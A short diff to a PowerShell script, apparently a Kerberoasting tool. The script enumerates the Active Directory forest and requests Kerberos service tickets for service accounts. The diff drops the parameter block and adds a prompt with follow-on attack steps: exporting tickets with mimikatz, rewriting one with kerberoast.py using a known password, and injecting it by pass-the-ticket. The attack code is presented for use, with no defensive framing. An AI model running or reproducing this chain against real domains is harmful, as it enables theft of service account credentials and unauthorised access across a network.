@@ -17,12 +17,6 @@
   .\Create-TGSInMemory
 #>
 
-[CmdletBinding()]
-Param(
-  [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
-  [Parameter(Mandatory=$False)] [string]$Filter
-)
-
 Add-Type -AssemblyName System.IdentityModel
 
 $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
@@ -41,3 +35,5 @@ foreach ($result in $results) {
         New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$($spn.ToString())"
     }
 }
+
+Read-Host "Now `n1) extract the tickets from your memory with: mimikatz # kerberos::list /export`n2) Crack with... `n3)./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -g 512 `n4)kerberos::ptt sql.kirbi"
